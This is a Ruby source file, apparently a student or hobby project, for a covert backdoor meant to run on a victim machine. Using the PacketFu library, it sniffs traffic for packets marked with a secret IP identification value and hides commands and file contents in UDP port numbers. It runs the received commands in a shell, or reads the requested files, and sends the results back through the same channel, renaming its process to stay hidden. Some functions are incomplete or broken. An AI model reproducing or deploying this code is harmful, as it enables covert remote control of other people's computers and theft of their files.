# Runs on victim machine, allows remote execution through client app
require 'rubygems'
require 'packetfu'

include PacketFu

#TODO: Move these functions to a diff file
# Utility function for loading latest config
def loadConfig(filePath)
	#TODO: Load up file and get config
	#For now just hard coded.
	$iName = "eth0"
	$identKey = 12345
	listenPortMain = "80" # Port to listen for connection requests
	$dataPort = "2289"
	processName = "xyz" # Change process name to hide.
	filterTCP = "tcp and port #{listenPortMain}"
	$userCmdField = "src-port" # Options: src-port, dst-port
	$userCmdRun = "20"
	$procName = "rubyTest1"
end

# Function for handling client session
def clientListen(ip,port)
	# Start listening for connection packets via UDP
	capturedUDP = PacketFu::Capture.new(:iface => config[:iface], :start => true, :promisc => true, :filter => "udp and port #{port} and src host #{ip}")

	capturedUDP.stream.each { |packet|
		pkt = Packet.parse packet
		# Check that it is a UDP packet
		if pkt.is_udp?
			# Is it one of our UDP packets?
			if pkt.ip_id == identKey
				# Get the data
				data = pkt.payload()
				# Look for the command type
				if userCmdField == "src-port"
					cmdFieldVal = pkt.udp_src
				end
				if userCmdField == "dst-port"
					cmdFieldVal = pkt.udp_dst
				end
				# Command processing
				if userCmdField == userCmdRun
					cmdDataChrs = [];
					# Check for sequence number
					seqCurrent = pkt.payload[0].unpack("H*")[0].to_i
					seqTotal   = pkt.payload[1].unpack("H*")[0].to_i
					dataLen    = (pkt.payload[2].unpack("H*").chr + pkt.payload[2].unpack("H*").chr).to_i
					while pos <= dataLen do
						cmdDataChrs.push(pkt.payload[pos])
						pos = pos + 1
					end
					cmdData = cmdDataChrs.unpack("H*")
					print "Got command: #{cmdData}"
				end
			end
		end
	}
end
# Custom checksum function (So we can use custom IP ID)
def ip_calc_sum(pkt)
        checksum =  (((pkt.ip_v  <<  4) + pkt.ip_hl) << 8) + pkt.ip_tos
        checksum += pkt.ip_len
        checksum +=  pkt.ip_id
        checksum += pkt.ip_frag
        checksum +=  (pkt.ip_ttl << 8) + pkt.ip_proto
        checksum += (pkt.ip_src >> 16)
        checksum += (pkt.ip_src & 0xffff)
        checksum += (pkt.ip_dst >> 16)
        checksum += (pkt.ip_dst & 0xffff)
        checksum = checksum % 0xffff 
        checksum = 0xffff - checksum
        checksum == 0 ? 0xffff : checksum
        return checksum
end
#Construct TCP Packet
def tcpConstruct(identKey,eth_dst,srcIP,srcPort,dstIP,dstPort,flags, payload, ack, seq)
	#--> Build TCP/IP
    
    #- Build Ethernet header:---------------------------------------
    pkt = PacketFu::TCPPacket.new(:config => $config , :flavor => "Linux")
	# pkt.eth_src = "00:11:22:33:44:55" # Ether header: Source MAC ; you can use: pkt.eth_header.eth_src
	pkt.eth_dst = eth_dst # Ether header: Destination MAC ; you can use: pkt.eth_header.eth_dst
    pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_id = identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 6	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_src = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_dst = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- TCP header:---------------------------------------
    pkt.payload = payload	# TCP header: packet header(body)
    pkt.tcp_flags.ack = flags[0]	# TCP header: Acknowledgment
    pkt.tcp_flags.fin = flags[1]	# TCP header: Finish
    pkt.tcp_flags.psh = flags[2]	# TCP header: Push
    pkt.tcp_flags.rst = flags[3]	# TCP header: Reset
    pkt.tcp_flags.syn = flags[4]	# TCP header: Synchronize sequence numbers
    pkt.tcp_flags.urg = flags[5]	# TCP header: Urgent pointer
    pkt.tcp_ecn = 0	# TCP header: ECHO
    pkt.tcp_win	= 8192	# TCP header: Window
    pkt.tcp_hlen = 5	# TCP header: header length
    pkt.tcp_src = srcPort	# TCP header: Source Port (random is the default )
    pkt.tcp_dst = dstPort	# TCP header: Destination Port (make it random/range for general scanning)
    pkt.tcp_ack = ack
    pkt.tcp_seq = seq
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    pkt.ip_id = identKey
    pkt.ip_sum = ip_calc_sum(pkt)
    return pkt
end

def hexToAscii(hex_str)
	chars = 
	hex_str.split('').in_groups_of(2){|c| ascii_str << (c[0]+c[1]).hex.chr }
    return ascii_str
end

def udpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,payload)
	pkt = PacketFu::UDPPacket.new(:config => $config , :flavor => "Linux")
	dstMAC = PacketFu::Utils::arp(dstIP, :iface=>"eth0")
	pkt.eth_proto	# Ether header: Protocol ; you can use: pkt.eth_header.eth_proto
	pkt.eth_dst =   PacketFu::EthHeader::mac2str(dstMAC)
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	# IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	# IP header: IP header length ; you can use: pkt.ip_header.ip_hl
    pkt.ip_tos	= 0	# IP header: Type of service ; you can use: pkt.ip_header.ip_tos
    pkt.ip_len	= 20	# IP header: Total Length ; you can use: pkt.ip_header.ip_len
    pkt.ip_frag = 0	# IP header: Don't Fragment ; you can use: pkt.ip_header.ip_frag
    pkt.ip_ttl = 115	# IP header: TTL(64) is the default ; you can use: pkt.ip_header.ip_ttl
    pkt.ip_proto = 17	# IP header: Protocol = tcp (6) ; you can use: pkt.ip_header.ip_proto
    pkt.ip_sum	# IP header: Header Checksum ; you can use: pkt.ip_header.ip_sum
    pkt.ip_saddr = srcIP	# IP header: Source IP. use $config[:ip_saddr] if you want your real IP ; you can use: pkt.ip_header.ip_saddr
    pkt.ip_daddr = dstIP	# IP header: Destination IP ; you can use: pkt.ip_header.ip_daddr
    #- UDP header:---------------------------------------
    pkt.payload = payload
    pkt.udp_src = srcPort
    pkt.udp_dst = dstPort
    pkt.recalc	# Recalculate/re-build whole pkt (should be at the end)
    pkt.ip_id = $identKey	# IP header: Identification ; you can use: pkt.ip_header.ip_id
    pkt.ip_sum = ip_calc_sum(pkt)
    return pkt
end

def sendData(identKey,srcIP,dstIP,srcPort,dstPort,payload)
	udpPacket = udpConstruct(identKey,srcIP,srcPort,dstIP,dstPort,payload)
	udpPacket.to_w # Sent
	print "Data Sent\n"
end

def sendUDPData(input,srcIP,dstIP)
	# Split data up and send it
	srcBytes = []
	dstBytes = []
	finished = false
	puts "input = #{input}\n"
	input.each_byte { |byte|
		if srcBytes.length != 2
			srcBytes.push(byte)
		elsif dstBytes.length != 2
			dstBytes.push(byte)
		end
		# Full? Then Send!
		if srcBytes.length == 2 && dstBytes.length == 2
			sendData($identKey,srcIP,dstIP,srcBytes.pack("U*"),dstBytes.pack("U*"),"") # Sent
			# Clear Buffers
			srcBytes = []
			dstBytes = []
		end
	}
	# Do we have any bytes left to send?
	if srcBytes.length > 0
		if dstBytes.length > 0
			puts "dstBytes = #{dstBytes}\n"
			sendData($identKey,srcIP,dstIP,srcBytes.pack("U*"),dstBytes.pack("U*"),"") # Sent
		else
			sendData($identKey,srcIP,dstIP,srcBytes.pack("U*"),54321,"") # Sent with ending tag
		end
	end
						
	# All Bytes Sent, should we send closing packet?
	if !finished
		sendData($identKey,srcIP,dstIP,54321,54321,"") # Sent
	end
end

def dataListener(identKey,dstIP,dstPort)
	# Listen for UDP data packets
	print "Listening for Data from #{dstIP}\n"
	capturedUDP = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :promisc => true, :filter => "udp")
	retrBytes = ""
	finalData = ""
	dstIP = ""
	srcIP = ""
	capturedUDP.stream.each { |packet|
		pkt = Packet.parse packet
		if pkt.is_udp? && pkt.ip_id == $identKey
			dstIP = pkt.ip_saddr
			srcIP = pkt.ip_daddr
			puts "srcIP: #{srcIP}"
			# Collect 2 bytes from src port first
			if pkt.udp_src == 54321 || pkt.udp_src == 0
				puts "Got END cmd\n"
				break
			elsif
				# Add these bytes 
				finalData = finalData + [pkt.udp_src.to_s(16)].pack("H*")
			end
			# Now collect from dst port
			if pkt.udp_dst == 54321 || pkt.udp_dst == 0
				puts "Got END from dst\n"
				break
			elsif
				# Add bytes
				finalData = finalData + [pkt.udp_dst.to_s(16)].pack("H*")
			end
		end	
	}
	puts "String Data: #{finalData.chomp}"
	sleep(2)
	# Check if we have a file request, or a command
	puts "File exists for #{finalData.chomp}? #{FileTest.file?(finalData.chomp)}"
	if FileTest.file?(finalData.chomp)
		file = File.open(finalData.chomp, "r")
		contents = file.read
		fileName = File.basename(finalData.chomp)
		fileReturnData = "#{fileName}||#{contents}"
		# Send the file
		sendUDPData(fileReturnData,srcIP,dstIP)
	else
		# Not a file, so Execute the command
		input = `#{finalData}`
		# Send back the response
		sendUDPData(input,srcIP,dstIP)
	end
end
# - - - - Begin Main

# Get config from file
loadConfig("/path/to/file.txt")
# Change the process name
$0=$procName

$config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $iName)).config # set interface
#$config = PacketFu::Config.new(:iface=> $iName).config # use this line instead of above if you face `whoami?': uninitialized constant PacketFu::Capture (NameError)


#TODO: Mask process name from config
begin
	# Start listening for connection packets via TCP
	print "starting up\n"
	$stdout.flush
	capturedTCP = PacketFu::Capture.new(:iface => $iName, :start => true, :promisc => true, :filter => "tcp")
	capturedTCP.stream.each { |pack|
		pkt = Packet.parse pack
		# Check that it is a TCP packet?
		puts "got packet"
		if pkt.is_tcp?
			# Is it one of our SYN packets?
			if pkt.tcp_flags.syn == 1 && pkt.ip_id == $identKey
				puts "Is one of ours"
				# TODO: Respond with SYN/ACK
				flags = [1,0,0,0,1,0]
				payload = ""
				tcpResp = tcpConstruct($identKey,pkt.eth_src,$config[:ip_src],80,pkt.ip_src,pkt.tcp_src,flags, payload,pkt.tcp_seq+1,pkt.tcp_ack)
				puts "ACK: #{tcpResp.tcp_ack}"
				# Pause, give client time to wait for us
				sleep(5)
				tcpResp.to_w # Sent
				# TODO: Use thread instead.
				dataListener($identKey,pkt.ip_src,pkt.tcp_src)
			end
		end
	}
	rescue Interrupt
	puts "Interrupted by User"
	exit 0
end
